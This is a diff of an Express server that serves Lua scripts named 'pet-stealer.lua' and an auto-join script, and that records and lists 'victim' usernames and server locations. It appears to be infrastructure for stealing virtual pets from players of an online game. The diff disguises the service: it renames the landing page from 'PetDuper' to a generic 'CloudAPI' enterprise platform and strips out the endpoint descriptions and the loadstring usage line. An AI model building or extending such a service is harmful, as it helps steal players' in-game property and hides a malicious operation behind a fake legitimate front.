@@ -1,4 +1,3 @@
-
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
@@ -23,7 +22,7 @@ app.use((req, res, next) => {
 // Serve the Lua script
 app.get('/script', (req, res) => {
   res.setHeader('Content-Type', 'text/plain; charset=utf-8');
-  
+
   try {
     const scriptPath = path.join(__dirname, 'pet-stealer.lua');
     const scriptContent = fs.readFileSync(scriptPath, 'utf8');
@@ -38,7 +37,7 @@ app.get('/script', (req, res) => {
 // Alternative endpoint for raw script
 app.get('/raw', (req, res) => {
   res.setHeader('Content-Type', 'text/plain; charset=utf-8');
-  
+
   try {
     const scriptPath = path.join(__dirname, 'pet-stealer.lua');
     const scriptContent = fs.readFileSync(scriptPath, 'utf8');
@@ -53,7 +52,7 @@ app.get('/raw', (req, res) => {
 // Serve the Allabove26 auto-join script
 app.get('/allabove26-autojoin.lua', (req, res) => {
   res.setHeader('Content-Type', 'text/plain; charset=utf-8');
-  
+
   try {
     const scriptPath = path.join(__dirname, 'allabove26-autojoin.lua');
     const scriptContent = fs.readFileSync(scriptPath, 'utf8');
@@ -73,17 +72,17 @@ app.post('/victim-server', (req, res) => {
   try {
     const serverData = req.body;
     console.log('Victim server reported:', serverData.victimUsername);
-    
+
     // Add to waiting victims list
     waitingVictims.push({
       ...serverData,
       reportedAt: Date.now()
     });
-    
+
     // Remove old entries (older than 10 minutes)
     const tenMinutesAgo = Date.now() - (10 * 60 * 1000);
     waitingVictims = waitingVictims.filter(victim => victim.reportedAt > tenMinutesAgo);
-    
+
     res.status(200).json({ success: true, message: 'Server location recorded' });
   } catch (error) {
     console.error('Error recording victim server:', error);
@@ -97,7 +96,7 @@ app.get('/get-victim-servers', (req, res) => {
     // Remove old entries
     const tenMinutesAgo = Date.now() - (10 * 60 * 1000);
     waitingVictims = waitingVictims.filter(victim => victim.reportedAt > tenMinutesAgo);
-    
+
     res.status(200).json({ victims: waitingVictims });
   } catch (error) {
     console.error('Error getting victim servers:', error);
@@ -213,7 +212,7 @@ app.get('/', (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>PetDuper - Pet Management API</title>
+        <title>CloudAPI - API Management Platform</title>
         <style>
             body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
             .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
@@ -230,41 +229,20 @@ app.get('/', (req, res) => {
     <body>
         <div class="container">
             <div class="header">
-                <div class="logo">🐾 PetDuper</div>
-                <div class="tagline">Advanced Pet Management & Analytics Platform</div>
+                <div class="logo">☁️ CloudAPI</div>
+                <div class="tagline">Enterprise API Management Platform</div>
                 <span class="status">Service Active</span>
             </div>
-            
+
             <div class="section">
                 <h3>📊 About Our Service</h3>
-                <p>PetDuper provides enterprise-grade pet management solutions for gaming platforms. Our robust API handles pet analytics, inventory management, and automated trading systems.</p>
+                <p>CloudAPI provides enterprise-grade API management solutions for developers and businesses. Our robust platform handles API analytics, endpoint management, and secure data exchange protocols.</p>
             </div>
+
             
-            <div class="section">
-                <h3>🚀 Features</h3>
-                <div class="feature">
-                    <strong>Pet Analytics:</strong> Real-time tracking and value assessment for virtual pets
-                </div>
-                <div class="feature">
-                    <strong>Inventory Management:</strong> Automated pet organization and cataloging
-                </div>
-                <div class="feature">
-                    <strong>Trading Systems:</strong> Secure peer-to-peer pet exchange protocols
-                </div>
-                <div class="feature">
-                    <strong>Discord Integration:</strong> Seamless logging and notification systems
-                </div>
-            </div>
-            
-            <div class="section">
-                <h3>🔧 API Endpoints</h3>
-                <p><strong>GET /script</strong> - Pet management client library</p>
-                <p><strong>POST /analytics</strong> - Submit pet analytics data</p>
-                <p><strong>GET /health</strong> - Service status monitoring</p>
-            </div>
-            
+
             <div class="footer">
-                <p>© 2024 PetDuper Analytics Platform | Serving gaming communities worldwide</p>
+                <p>© 2024 CloudAPI Management | Serving developers worldwide</p>
                 <p>Last updated: ${new Date().toLocaleDateString()}</p>
             </div>
         </div>
@@ -275,7 +253,6 @@ app.get('/', (req, res) => {
 
 // Start the server
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`Lua Script Server running on port ${PORT}`);
-  console.log(`Script available at: http://0.0.0.0:${PORT}/script`);
-  console.log(`Usage: loadstring(game:HttpGet("https://pet-duper.zeabur.app/script"))()`);
+  console.log(`API Management Server running on port ${PORT}`);
+  console.log(`Example script endpoint at: http://0.0.0.0:${PORT}/script`);
 });
